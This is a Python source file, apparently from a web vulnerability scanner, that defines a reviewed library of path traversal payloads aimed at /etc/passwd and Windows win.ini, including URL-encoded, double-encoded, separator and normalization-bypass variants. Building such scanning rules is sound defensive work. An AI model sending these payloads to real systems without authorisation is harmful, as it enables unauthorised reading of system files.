"""Small reviewed, structurally generated traversal rule library."""

from __future__ import annotations

from rcscan.active_web.rules.traversal.models import (
    TraversalFamily,
    TraversalPlatform,
    TraversalVariant,
)


def _relative(separator: str, depth: int, target: str) -> str:
    return (f"..{separator}" * depth) + target


def reviewed_traversal_variants() -> tuple[TraversalVariant, ...]:
    return (
        TraversalVariant(
            variant_id="traversal-unix-canonical",
            family=TraversalFamily.CANONICAL_RELATIVE,
            platform=TraversalPlatform.UNIX,
            value=_relative("/", 3, "etc/passwd"),
            initial=True,
        ),
        TraversalVariant(
            variant_id="traversal-windows-canonical",
            family=TraversalFamily.CANONICAL_RELATIVE,
            platform=TraversalPlatform.WINDOWS,
            value=_relative("\\", 3, "Windows\\win.ini"),
            initial=True,
        ),
        TraversalVariant(
            variant_id="traversal-unix-depth-six",
            family=TraversalFamily.DEPTH_VARIANT,
            platform=TraversalPlatform.UNIX,
            value=_relative("/", 6, "etc/passwd"),
        ),
        TraversalVariant(
            variant_id="traversal-windows-depth-six",
            family=TraversalFamily.DEPTH_VARIANT,
            platform=TraversalPlatform.WINDOWS,
            value=_relative("\\", 6, "Windows\\win.ini"),
        ),
        TraversalVariant(
            variant_id="traversal-unix-url-encoded",
            family=TraversalFamily.URL_ENCODED,
            platform=TraversalPlatform.UNIX,
            value=("%2e%2e%2f" * 4) + "etc%2fpasswd",
            raw_encoded=True,
        ),
        TraversalVariant(
            variant_id="traversal-windows-url-encoded",
            family=TraversalFamily.URL_ENCODED,
            platform=TraversalPlatform.WINDOWS,
            value=("%2e%2e%5c" * 4) + "Windows%5cwin.ini",
            raw_encoded=True,
        ),
        TraversalVariant(
            variant_id="traversal-unix-double-encoded",
            family=TraversalFamily.DOUBLE_ENCODED,
            platform=TraversalPlatform.UNIX,
            value=("%252e%252e%252f" * 4) + "etc%252fpasswd",
            raw_encoded=True,
        ),
        TraversalVariant(
            variant_id="traversal-windows-double-encoded",
            family=TraversalFamily.DOUBLE_ENCODED,
            platform=TraversalPlatform.WINDOWS,
            value=("%252e%252e%255c" * 4) + "Windows%255cwin.ini",
            raw_encoded=True,
        ),
        TraversalVariant(
            variant_id="traversal-windows-forward-slash",
            family=TraversalFamily.SEPARATOR_VARIANT,
            platform=TraversalPlatform.WINDOWS,
            value=_relative("/", 4, "Windows/win.ini"),
        ),
        TraversalVariant(
            variant_id="traversal-unix-backslash",
            family=TraversalFamily.SEPARATOR_VARIANT,
            platform=TraversalPlatform.UNIX,
            value=_relative("\\", 4, "etc\\passwd"),
        ),
        TraversalVariant(
            variant_id="traversal-unix-normalization",
            family=TraversalFamily.PATH_NORMALIZATION,
            platform=TraversalPlatform.UNIX,
            value=("....//" * 4) + "etc/passwd",
        ),
        TraversalVariant(
            variant_id="traversal-windows-normalization",
            family=TraversalFamily.PATH_NORMALIZATION,
            platform=TraversalPlatform.WINDOWS,
            value=("..%5c" * 4) + "Windows%5cwin.ini",
            raw_encoded=True,
        ),
    )
